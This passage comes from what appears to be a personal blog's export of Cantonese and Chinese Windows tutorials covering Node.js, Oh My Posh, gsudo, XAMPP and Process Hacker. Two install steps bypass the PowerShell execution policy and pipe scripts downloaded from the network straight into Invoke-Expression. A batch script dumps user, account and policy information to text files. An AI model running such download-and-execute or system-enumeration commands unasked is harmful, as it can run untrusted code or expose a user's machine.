<h2 id="安裝完成"><a href="#安裝完成" class="headerlink" title="安裝完成"></a>安裝完成</h2><p>完成後，按 <code>Finish</code>。</p>
<img src="/2022/06/26/windows-install-nodejs/9.png" class="">

<h1 id="確定已安裝成功"><a href="#確定已安裝成功" class="headerlink" title="確定已安裝成功"></a>確定已安裝成功</h1><p>接下來我們需要確定已經安裝成功，因為有時候可能會出現錯誤。</p>
<hr>
<h2 id="開啟-CMD"><a href="#開啟-CMD" class="headerlink" title="開啟 CMD"></a>開啟 CMD</h2><p>我們使用指令台確定已安裝 Node,NPM。</p>
<p>直接於 Windows 右下角輸入 <code>CMD</code> 尋找並將他開啟。 </p>
<img src="/2022/06/26/windows-install-nodejs/10.gif" class="">

<h3 id="輸入-npm"><a href="#輸入-npm" class="headerlink" title="輸入 npm"></a>輸入 npm</h3><p>開啟 <code>CMD</code> 後輸入以下指令看看有沒有反應：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/windows-install-nodejs/11.gif" class="">

<h3 id="輸入-node"><a href="#輸入-node" class="headerlink" title="輸入 node"></a>輸入 node</h3><p>輸入以下指令看看有沒有反應：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/windows-install-nodejs/12.gif" class="">

<h2 id="確定後"><a href="#確定後" class="headerlink" title="確定後"></a>確定後</h2><p>確定兩者都有反應後可以直接將視窗關掉，這樣就安裝成功了。</p>
]]></content>
      <categories>
        <category>NodeJS</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>NPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - Batch 檔案生產電腦資料</title>
    <url>/2022/01/09/windows-get-info-pc-dos-txt/</url>
    <content><![CDATA[<h1 id="建立。"><a href="#建立。" class="headerlink" title="建立。"></a>建立。</h1><p>右鍵開個 <code>txt file</code> 再改副檔名做 <code>bat</code></p>
<p>再入去打呢段野。</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">ipconfig</span> /all &gt; IP.txt</span><br><span class="line">whoami &gt; username.txt</span><br><span class="line">gpresult /r &gt; info.txt</span><br><span class="line"><span class="built_in">net</span> user &gt; user.txt</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>完成之後再開個 File 就會自動喺而加既 Paths 生產4個 Files.</p>
<p><code>IP.txt</code><br><code>username.txt</code><br><code>info.txt</code><br><code>user.txt</code></p>
<p>之後… 你鐘意啦 xD</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Oh My Posh - 美化你的終端機 (Powershell)</title>
    <url>/2022/06/23/windows-install-oh-my-posh/</url>
    <content><![CDATA[<img src="/img/Post/image/ohmyposh/logo.svg" width="200px"/>

<h1 id="Oh-My-posh"><a href="#Oh-My-posh" class="headerlink" title="Oh My posh"></a>Oh My posh</h1><p>Oh My Posh 是一個能夠自定義終端機，美化你的終端機，自訂指令來使用的一個 shell。</p>
<p>【名稱】：Oh My posh<br>【網站】：<a href="https://ohmyposh.dev/">按這裡</a><br>【用途】：美化終端機</p>
<h1 id="下載字體"><a href="#下載字體" class="headerlink" title="下載字體"></a>下載字體</h1><p>如果要顯示全部 Oh my Posh 的主題全部正常顯示，我們需要安裝 <a href="https://www.nerdfonts.com/font-downloads">Nerd Font</a> 的字體。</p>
<div class="note info flat">
    說明 : 選擇一個你喜歡的使用。
</div>

<img src="/2022/06/23/windows-install-oh-my-posh/1.png" class="">

<h2 id="安裝字體"><a href="#安裝字體" class="headerlink" title="安裝字體"></a>安裝字體</h2><p>下載檔案後會是一個 <code>zip</code> 檔案，將他解壓後鍵盤按 <kbd>Ctrl</kbd>+<kbd>A</kbd> 全選，然後按 <code>右鍵</code>，<code>安裝(I)</code>。</p>
<img src="/2022/06/23/windows-install-oh-my-posh/hi.gif" class="">

<h1 id="安裝-Oh-My-Posh"><a href="#安裝-Oh-My-Posh" class="headerlink" title="安裝 Oh My Posh"></a>安裝 Oh My Posh</h1><p>方法有三種，包括 :</p>
<ul>
<li>winget</li>
<li>scoop</li>
<li>Powershell</li>
</ul>
<hr>
<h2 id="Winget-安裝-Oh-My-Posh"><a href="#Winget-安裝-Oh-My-Posh" class="headerlink" title="Winget 安裝 Oh My Posh"></a>Winget 安裝 Oh My Posh</h2><p>開啟 Powershell 輸入以下指令 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winget install JanDeDobbeleer.OhMyPosh -s winget</span><br></pre></td></tr></table></figure>

<h2 id="Scoop-安裝-Oh-My-Posh"><a href="#Scoop-安裝-Oh-My-Posh" class="headerlink" title="Scoop 安裝 Oh My Posh"></a>Scoop 安裝 Oh My Posh</h2><p>開啟 Powershell 輸入以下指令 :</p>
<div class="note warning flat">
    注意 : 你必須本身已經安裝了 <code>Scoop</code>，如果沒有，建議使用 Powershell 或者 winget 安裝。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scoop install https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/oh-my-posh.json</span><br></pre></td></tr></table></figure>



<h2 id="Power-Shell-安裝-Oh-My-Posh"><a href="#Power-Shell-安裝-Oh-My-Posh" class="headerlink" title="Power Shell 安裝 Oh My Posh"></a>Power Shell 安裝 Oh My Posh</h2><p>開啟 Powershell 輸入以下指令 :</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span> <span class="literal">-Force</span>; <span class="built_in">Invoke-Expression</span> ((<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;https://ohmyposh.dev/install.ps1&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h1 id="安裝-Module"><a href="#安裝-Module" class="headerlink" title="安裝 Module"></a>安裝 Module</h1><p>接下來我們需要安裝需要的 Module 以顯示 <code>圖示</code>，<code>顏色</code>。</p>
<div class="note warning flat">
    請使用 <code>系統管理員</code> 身份開啟 PowerShell。
</div>

<hr>
<h2 id="安裝-PSReadLine"><a href="#安裝-PSReadLine" class="headerlink" title="安裝 PSReadLine"></a>安裝 PSReadLine</h2><div class="note info flat">
    此 Module 用於顯示你以前輸入過的指令，以方便你輸入指令。
</div>

<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> PSReadLine <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/3.gif" class="">

<h2 id="安裝-posh-git"><a href="#安裝-posh-git" class="headerlink" title="安裝 posh-git"></a>安裝 posh-git</h2><div class="note info flat">
    此 Module 用於顯示你當前 <code>repe</code> 的 git 資訊 (如果有 git <code>repo</code>)。
</div>

<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> posh<span class="literal">-git</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/4.gif" class="">

<h2 id="安裝-Terminal-icons"><a href="#安裝-Terminal-icons" class="headerlink" title="安裝 Terminal-icons"></a>安裝 Terminal-icons</h2><div class="note info flat">
    說明 : 此 Module 用於在指令台顯示你檔案和資料夾圖示。
</div>

<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> Terminal<span class="literal">-icons</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
<img src="/2022/06/23/windows-install-oh-my-posh/5.gif" class="">

<h1 id="置入-Module"><a href="#置入-Module" class="headerlink" title="置入 Module"></a>置入 Module</h1><p>基於我們只有安裝，還沒真正使用他的功能，接下來會說明如何置入 Module 至 Powershell。</p>
<h2 id="置入-Terminal-icons"><a href="#置入-Terminal-icons" class="headerlink" title="置入 Terminal-icons"></a>置入 Terminal-icons</h2><p>輸入以下指令置入 :</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> Terminal<span class="literal">-icons</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/6.gif" class="">

<h3 id="修復亂碼問題-icons"><a href="#修復亂碼問題-icons" class="headerlink" title="修復亂碼問題 (icons)"></a>修復亂碼問題 (icons)</h3><p>輸入 <code>ls</code> 後發現圖示不能正常顯示，原因是因為字體問題，我們需要到設定修改字體。</p>
<p>另外，修改的字體為你剛剛下載的字體 (必須為 <code>Nerd Font</code> 的字體)。</p>
<p>步驟 : <code>設定</code> &gt; <code>預設值</code> &gt; <code>外觀</code> &gt; <code>字體</code>。</p>
<div class="note warning flat">
    注意 : 修改的字體必須為 <code>Nerd Font</code> 的字體
</div>

<img src="/2022/06/23/windows-install-oh-my-posh/set.gif" class="">


<h2 id="置入-posh-git"><a href="#置入-posh-git" class="headerlink" title="置入 posh-git"></a>置入 posh-git</h2><p>posh-git 是用來顯示你 <code>git</code> 內的資訊，例如將你目前的 <code>repo</code> 內的 branch 顯示是什麼名稱。</p>
<p>要使用的話，輸入以下指令置入 :</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> posh<span class="literal">-git</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/git.gif" class="">


<h2 id="置入-PSReadLine"><a href="#置入-PSReadLine" class="headerlink" title="置入 PSReadLine"></a>置入 PSReadLine</h2><p>PSReadLine 是由 History 內的指令所形成，他有幾種模式。</p>
<p>要使用的話，輸入以下指令置入 :</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> PSReadLine</span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/psreadline.gif" class="">

<h3 id="PSReadLine-模式-History"><a href="#PSReadLine-模式-History" class="headerlink" title="PSReadLine 模式 (History)"></a>PSReadLine 模式 (History)</h3><p>這個是最多 Linux 系統內也有的模式，也是我最喜歡的模式，輸入以下指令使用：</p>
<blockquote>
<p>說明 : 如果前面的文字有你輸入的文字，後面又符合和前面的文字，將會以灰色提示的方式顯示文字。</p>
</blockquote>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionSource</span> <span class="built_in">History</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/yt.gif" class="">

<h3 id="PSReadLine-模式-ListView"><a href="#PSReadLine-模式-ListView" class="headerlink" title="PSReadLine 模式 (ListView)"></a>PSReadLine 模式 (ListView)</h3><p>這個會列出你所有有關你輸入的文字的指令。</p>
<div class="note info flat">
    提示 : 使用鍵盤 ↑ ↓ ← → 控制選擇。按下 Enter 輸入指令。
</div>

<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionViewStyle</span> ListView</span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/lv.gif" class="">


<h2 id="列出可用-Themes-主題"><a href="#列出可用-Themes-主題" class="headerlink" title="列出可用 Themes (主題)"></a>列出可用 Themes (主題)</h2><p>Oh my Posh 提供了很多主題，可以到這網站查看 : <a href="https://ohmyposh.dev/docs/themes">https://ohmyposh.dev/docs/themes</a><br>又或者你可以輸入以下指令直接查看樣式：</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-PoshThemes</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/list.gif" class="">

<p>當你找到你想使用的主題後，輸入以下指令列出所有主題的檔案：</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> <span class="variable">$env:POSH_THEMES_PATH</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/themes.gif" class="">


<h3 id="更改-Themes-格式"><a href="#更改-Themes-格式" class="headerlink" title="更改 Themes 格式"></a>更改 Themes 格式</h3><p>當你已經找到你想用的主題後，更改格式是這樣 :</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">oh</span><span class="literal">-my</span><span class="literal">-posh</span> init pwsh -<span class="literal">-config</span> <span class="variable">$env:POSH_THEMES_PATH</span>\your_themes_json_files | <span class="built_in">Invoke-Expression</span></span><br></pre></td></tr></table></figure>

<h3 id="示範更改-Themes"><a href="#示範更改-Themes" class="headerlink" title="示範更改 Themes"></a>示範更改 Themes</h3><p>輸入以下指令使用，我以 <code>microverse-power.omp.json</code> 做示範，程式碼會像這樣：</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">oh</span><span class="literal">-my</span><span class="literal">-posh</span> init pwsh -<span class="literal">-config</span> <span class="variable">$env:POSH_THEMES_PATH</span>\microverse<span class="literal">-power</span>.omp.json | <span class="built_in">Invoke-Expression</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/ch.gif" class="">

<h1 id="Profile-檔案"><a href="#Profile-檔案" class="headerlink" title="Profile 檔案"></a>Profile 檔案</h1><p>上面的操作只有這個視窗的生效，如果你把視窗關掉原本放入去的 Module 會通通沒有，<br>所以我們需要修改 Powershell 的 <code>$Profile</code>，只要你開啟 <code>Powershell</code> 就會載入這個檔案。</p>
<h2 id="查看-Profile-位置"><a href="#查看-Profile-位置" class="headerlink" title="查看 Profile 位置"></a>查看 Profile 位置</h2><p>如果要知道放置位置在哪裡，我們可以輸入以下指令查看：</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="variable">$PROFILE</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/profile.gif" class="">

<h2 id="開啟-Profile-檔案"><a href="#開啟-Profile-檔案" class="headerlink" title="開啟 Profile 檔案"></a>開啟 Profile 檔案</h2><p>將 PrintOut 出來的位置 copy，然後開啟檔案。</p>
<hr>
<h3 id="VSCODE-開啟"><a href="#VSCODE-開啟" class="headerlink" title="VSCODE 開啟"></a>VSCODE 開啟</h3><p>如果你本身有安裝 Visual Studio Code，可以輸入以下開啟後修改。</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">code <span class="variable">$PROFILE</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/code.gif" class="">

<h3 id="Notepad-開啟"><a href="#Notepad-開啟" class="headerlink" title="Notepad 開啟"></a>Notepad 開啟</h3><p>如果是使用 notepad 可以輸入以下指令開啟後修改。</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">notepad <span class="variable">$PROFILE</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/nd.gif" class="">

<h2 id="修改-Profile-檔案"><a href="#修改-Profile-檔案" class="headerlink" title="修改 Profile 檔案"></a>修改 Profile 檔案</h2><p>開啟檔案後，將以下內容放到裡面，再儲存檔案，然後再重新啟動 Terminal。</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> Terminal<span class="literal">-icons</span></span><br><span class="line"><span class="built_in">Import-Module</span> posh<span class="literal">-git</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set-PSReadLineOption</span> <span class="literal">-PredictionSource</span> <span class="built_in">History</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">oh</span><span class="literal">-my</span><span class="literal">-posh</span> init pwsh -<span class="literal">-config</span> <span class="variable">$env:POSH_THEMES_PATH</span>\microverse<span class="literal">-power</span>.omp.json | <span class="built_in">Invoke-Expression</span></span><br></pre></td></tr></table></figure>

<img src="/2022/06/23/windows-install-oh-my-posh/done.gif" class="">

<h1 id="文章使用指令"><a href="#文章使用指令" class="headerlink" title="文章使用指令"></a>文章使用指令</h1><p>以下會直接列出本文章已使用指令：</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">winget install JanDeDobbeleer.OhMyPosh <span class="literal">-s</span> winget</span><br><span class="line"></span><br><span class="line">scoop install https://github.com/JanDeDobbeleer/<span class="built_in">oh</span><span class="literal">-my</span><span class="literal">-posh</span>/releases/latest/download/<span class="built_in">oh</span><span class="literal">-my</span><span class="literal">-posh</span>.json</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span> <span class="literal">-Force</span>; <span class="built_in">Invoke-Expression</span> ((<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;https://ohmyposh.dev/install.ps1&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">Install-Module</span> PSReadLine <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Install-Module</span> posh<span class="literal">-git</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Install-Module</span> Terminal<span class="literal">-icons</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> Terminal<span class="literal">-icons</span></span><br><span class="line"><span class="built_in">Import-Module</span> Terminal<span class="literal">-icons</span></span><br><span class="line"><span class="built_in">Import-Module</span> PSReadLine</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionSource</span> <span class="built_in">History</span></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionViewStyle</span> ListView</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-PoshThemes</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> <span class="variable">$env:POSH_THEMES_PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">oh</span><span class="literal">-my</span><span class="literal">-posh</span> init pwsh -<span class="literal">-config</span> <span class="variable">$env:POSH_THEMES_PATH</span>\microverse<span class="literal">-power</span>.omp.json | <span class="built_in">Invoke-Expression</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$PROFILE</span></span><br><span class="line">code <span class="variable">$PROFILE</span></span><br><span class="line">notepad <span class="variable">$PROFILE</span></span><br></pre></td></tr></table></figure>

<h1 id="寫左三個鐘-…"><a href="#寫左三個鐘-…" class="headerlink" title="寫左三個鐘 …"></a>寫左三個鐘 …</h1><img src="/2022/06/23/windows-install-oh-my-posh/3hr.png" class="">]]></content>
      <categories>
        <category>Power Shell</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - 安裝 sudo 指令</title>
    <url>/2022/01/16/windows-install-sudo-command/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要成日左 Click 右 Click 先可以用到 Admin 權限打野，係咪好撚麻煩？<br>唔緊要，呢篇文就係介紹一款工具叫做 <a href="https://github.com/gerardog/gsudo">gsudo</a></p>
<p>佢就好似 Linux 既 sudo 咁<br>但係呢邊就同 Windows 一樣 佢會出個提示問你係咪要用系統管理員身份執行？<br>同 Linux 差唔多用法。</p>
<p>就好似…</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo notepad</span><br></pre></td></tr></table></figure>

<p>就係即時用 Admin 身分開 notepad，<br>咁就避免哂你要慢慢搵黎撳既步驟。</p>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><p>咁而加就講點樣下載啦！</p>
<p>下載方法係有幾個既，包括：</p>
<ul>
<li>Scoop 下載</li>
<li>Chocolatey 下載</li>
<li>Winget 下載</li>
<li>Powershell 下載</li>
</ul>
<h3 id="Scoop-下載"><a href="#Scoop-下載" class="headerlink" title="Scoop 下載"></a>Scoop 下載</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scoop install gsudo</span><br></pre></td></tr></table></figure>

<img src="/2022/01/16/windows-install-sudo-command/scoop.png" class="">

<h3 id="Chocolatey-下載"><a href="#Chocolatey-下載" class="headerlink" title="Chocolatey 下載"></a>Chocolatey 下載</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">choco install gsudo</span><br></pre></td></tr></table></figure>

<h3 id="Winget-下載"><a href="#Winget-下載" class="headerlink" title="Winget 下載"></a>Winget 下載</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winget install gerardog.gsudo</span><br></pre></td></tr></table></figure>

<h3 id="Powershell-下載"><a href="#Powershell-下載" class="headerlink" title="Powershell 下載"></a>Powershell 下載</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PowerShell -Command &quot;Set-ExecutionPolicy RemoteSigned -scope Process; iwr -useb https://raw.githubusercontent.com/gerardog/gsudo/master/installgsudo.ps1 | iex&quot;</span><br></pre></td></tr></table></figure>

<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>就咁打 sudo 就係 呢個 Termnial 改為 sudo 權限<br>或者你打 gsudo 都係一樣</p>
<p>或者你可以 打 查更多指令睇下點用法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo --help</span><br><span class="line">gsudo v1.0.2 (Branch.master.Sha.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx)</span><br><span class="line">Copyright(c) 2019-2021 Gerardo Grignoli and GitHub contributors</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">------</span><br><span class="line">gsudo [options]                         Elevates your current shell</span><br><span class="line">gsudo [options] &#123;command&#125; [args]        Runs &#123;command&#125; with elevated permissions</span><br><span class="line">gsudo [-h | --help]                     Shows this help</span><br><span class="line">gsudo [-v | --version]                  Shows gsudo version</span><br><span class="line">gsudo cache [on | off | help]           Starts/Stops an elevated cache session. (reduced UAC popups)</span><br><span class="line">gsudo config                            Show current config settings &amp; values.</span><br><span class="line">gsudo config &#123;key&#125; [--global] [value]   Read or write a user setting</span><br><span class="line">gsudo config &#123;key&#125; [--global] --reset   Reset config to default value</span><br><span class="line">gsudo status                            Show status about current user, security, integrity level or other gsudo relevant data.</span><br><span class="line"></span><br><span class="line">General options:</span><br><span class="line"> -n | --new             Starts the command in a new console (and returns immediately).</span><br><span class="line"> -w | --wait            When in new console, force wait for the command to end.</span><br><span class="line"> -s | --system          Run As Local System account (&quot;NT AUTHORITY\SYSTEM&quot;).</span><br><span class="line"> -i | --integrity &#123;v&#125;   Specify integrity level: Untrusted, Low, Medium, MediumPlus, High (default), System</span><br><span class="line"> -k | --reset-timestamp Kills all cached credentials. The next time gsudo is run a UAC popup will be appear.</span><br><span class="line"> -d | --direct          Execute &#123;command&#125; directly. Bypass shell wrapper (Pwsh/Yori/etc).</span><br><span class="line"> --copyns               Connect network drives to the elevated user. Warning: Verbose, interactive asks for credentials</span><br><span class="line"></span><br><span class="line">Other options:</span><br><span class="line"> --loglevel &#123;val&#125;       Set minimum log level to display: All, Debug, Info, Warning, Error, None</span><br><span class="line"> --debug                Enable debug mode.</span><br><span class="line"> --piped                (deprecated) Set console mode to piped StdIn/Out/Err.</span><br><span class="line"> --vt                   (deprecated) Set console mode to piped VT100 ConPty/PseudoConsole (experimental).</span><br><span class="line"> --attached             (deprecated) Set console mode to attached.</span><br><span class="line"> --copyev               (deprecated) Copy environment variables to the elevated process. (not needed on default console mode)</span><br><span class="line"></span><br><span class="line">Learn more about security considerations of using gsudo at: https://bit.ly/gsudoSecurity</span><br></pre></td></tr></table></figure>

<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><ul>
<li><a href="https://github.com/gerardog/gsudo">https://github.com/gerardog/gsudo</a></li>
</ul>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>XAMPP - 安裝 Apache 於 電腦上 (Windows)</title>
    <url>/2022/06/22/windows-install-xampp-Apache/</url>
    <content><![CDATA[<img src="/img/Post/image/XAMPP/xampp-logo-ac950edf.svg" width="200px"/>

<h1 id="什麼是-XAMPP？"><a href="#什麼是-XAMPP？" class="headerlink" title="什麼是 XAMPP？"></a>什麼是 XAMPP？</h1><p>XAMPP 是 Apache Friends 開發的免費開源跨平台 Web 服務器解決方案堆棧包，主要由 Apache HTTP Server、MariaDB 數據庫和 PHP 和 Perl 編程語言編寫的腳本解釋器組成</p>
<p>【程式名稱】：XAMPP<br>【官方網站】：<a href="https://www.apachefriends.org/index.html">按這裡</a><br>【下載檔案】：<a href="https://www.apachefriends.org/download.html">按這裡</a><br>【程式用途】：於本機位置建立 Apache HTTP Server (localhost)</p>
<h1 id="下載-XAMPP-安裝檔案"><a href="#下載-XAMPP-安裝檔案" class="headerlink" title="下載 XAMPP 安裝檔案"></a>下載 XAMPP 安裝檔案</h1><p>進入官方網站後，尋找最新版本下載檔案，見圖下。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/1.png" class="">


<h1 id="開啟-XAMPP-安裝檔案"><a href="#開啟-XAMPP-安裝檔案" class="headerlink" title="開啟 XAMPP 安裝檔案"></a>開啟 XAMPP 安裝檔案</h1><p>開啟後，他會要求你用 <code>系統管理員身份</code> 開啟。</p>
<p>會提示你的路徑擺位，按下 <code>OK</code> 後繼續。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/2.png" class="">

<h2 id="Setup-XAMPP"><a href="#Setup-XAMPP" class="headerlink" title="Setup XAMPP"></a>Setup XAMPP</h2><p>來到 setup Wizard 後，按下 <code>Next</code>。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/3.png" class="">


<h3 id="選擇安裝的-Components"><a href="#選擇安裝的-Components" class="headerlink" title="選擇安裝的 Components"></a>選擇安裝的 Components</h3><p>這邊直接全都要就好，以免後來你需要使用的時候又要再安裝多一次，所以直接按下 <code>Next</code> 後繼續。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/4.png" class="">

<h3 id="選擇安裝路徑"><a href="#選擇安裝路徑" class="headerlink" title="選擇安裝路徑"></a>選擇安裝路徑</h3><p>這邊直接使用預設的 <code>C:\xampp</code> 就好了，如果用其他有可能會有權限問題令到你不能開啟 localhost，所以是一樣，直接按下 <code>Next</code>。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/5.png" class="">


<h3 id="選擇語言"><a href="#選擇語言" class="headerlink" title="選擇語言"></a>選擇語言</h3><p>XAMPP 是沒有繁體中文的，所以直接使用英文吧，然後按 <code>Next</code>。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/6.png" class="">


<h3 id="Bitnami-for-XAMPP"><a href="#Bitnami-for-XAMPP" class="headerlink" title="Bitnami for XAMPP"></a>Bitnami for XAMPP</h3><p>這邊如果你會使用 Wordpess 這些的話是有用的，但如果沒有就直接跳過吧，加上如果要安裝我本人也建議直接下載 wordpress 的檔案在連結中安裝 wordpress，將 <code>checkbox</code> uncheck 後，按下 <code>Next</code>。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/7.png" class="">

<h3 id="準備安裝"><a href="#準備安裝" class="headerlink" title="準備安裝"></a>準備安裝</h3><p>確定以上的設定後，開始真正的安裝，按下 <code>Next</code>。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/8.png" class="">


<h3 id="安裝中-…"><a href="#安裝中-…" class="headerlink" title="安裝中 …"></a>安裝中 …</h3><p>靜心等待他安裝完成。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/9.png" class="">
<img src="/2022/06/22/windows-install-xampp-Apache/10.png" class="">
<img src="/2022/06/22/windows-install-xampp-Apache/11.png" class="">

<h2 id="防火牆設定"><a href="#防火牆設定" class="headerlink" title="防火牆設定"></a>防火牆設定</h2><p>這邊去到最後的時候，會彈出一個視窗要求防火牆權限，將 <code>私人網路</code> Tick 後，按下 <code>允許存取(A)</code> 後繼續。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/12.png" class="">

<h2 id="安裝完成"><a href="#安裝完成" class="headerlink" title="安裝完成"></a>安裝完成</h2><p>已經成功在你的電腦中安裝 XAMPP。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/13.png" class="">


<h1 id="XAMPP-Control-Panel"><a href="#XAMPP-Control-Panel" class="headerlink" title="XAMPP Control Panel"></a>XAMPP Control Panel</h1><p>這邊我不建議使用系統管理員身份開啟 XAMPP，所以我會直接吧程式關掉再開。</p>
<blockquote>
<p>注意 : XAMPP 視窗關掉後不是真正關掉了，你要在右下角的 <code>^</code> 找 XAMPP 再對住他右鍵將他關閉才真是正關閉 XAMPP。</p>
</blockquote>
<img src="/2022/06/22/windows-install-xampp-Apache/14.png" class="">


<h1 id="開啟-Server"><a href="#開啟-Server" class="headerlink" title="開啟 Server"></a>開啟 Server</h1><p>直接在 XAMPP Control Panel 的 <code>Apache</code> 按下 <code>Start</code>。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/15.gif" class="">

<h1 id="進入網頁"><a href="#進入網頁" class="headerlink" title="進入網頁"></a>進入網頁</h1><p>直接在瀏覽器輸入 <code>localhost</code>。</p>
<img src="/2022/06/22/windows-install-xampp-Apache/start.gif" class="">]]></content>
      <categories>
        <category>XAMPP</category>
      </categories>
      <tags>
        <tag>web Server</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - Process Hacker 監控系統資源的工具</title>
    <url>/2022/01/09/windows-Process-Hacker-tools/</url>
    <content><![CDATA[<img src="/2022/01/09/windows-Process-Hacker-tools/ProcessHacker.png" class="">

<h1 id="Process-Hacker"><a href="#Process-Hacker" class="headerlink" title="Process Hacker"></a>Process Hacker</h1><p><a href="https://processhacker.sourceforge.io/">Process Hacker</a>是一款免費、強大、多用途的工具，可幫助您監控系統資源、調試軟件和檢測惡意軟件。</p>
